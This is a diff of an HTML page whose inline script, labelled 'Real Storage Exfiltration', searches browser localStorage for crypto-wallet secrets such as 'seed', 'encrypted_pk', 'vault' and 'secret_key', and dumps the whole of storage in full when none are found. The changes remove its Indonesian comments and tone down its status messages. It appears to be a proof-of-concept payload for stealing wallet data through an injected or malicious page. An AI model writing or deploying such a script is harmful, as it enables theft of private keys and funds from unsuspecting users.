@@ -8,7 +8,7 @@
             font-family: monospace; 
             padding: 10px; 
             font-size: 12px; 
-            word-wrap: break-word; /* Memastikan teks panjang tidak memotong layar */
+            word-wrap: break-word; 
         }
     </style>
 </head>
@@ -18,29 +18,29 @@
     <script>
         const output = document.getElementById('output');
         
-        output.innerHTML += "[+] Real Storage Exfiltration Scan<br>";
-        output.innerHTML += "Scanning for sensitive keys...<br>";
+        output.innerHTML += "Real Storage Exfiltration<br>";
+        output.innerHTML += "Scanning For Sensitive Keys<br>";
         
         const sensitiveKeys = ['vault', 'wallet_data', 'encrypted_pk', 'seed', 'enc_pk', 'user_vault', 'web3_session', 'secret_key'];
         let found = false;
 
-        // Cek kunci sensitif
+        
         sensitiveKeys.forEach(key => {
             const data = localStorage.getItem(key);
             if (data) {
                 found = true;
-                // Menampilkan value secara FULL tanpa .substring()
+                
                 output.innerHTML += `Key: ${key} | Value: ${data}<br>`;
             }
         });
 
-        // Jika tidak ditemukan kunci sensitif, scan semua storage secara penuh
+        
         if (!found) {
-            output.innerHTML += "No common wallet keys found. Scanning all storage...<br>";
+            output.innerHTML += "<br>";
             for (let i = 0; i < localStorage.length; i++) {
                 const k = localStorage.key(i);
                 const v = localStorage.getItem(k);
-                // Menampilkan value secara FULL tanpa .substring()
+                
                 output.innerHTML += `Key: ${k} | Value: ${v}<br>`;
             }
         }
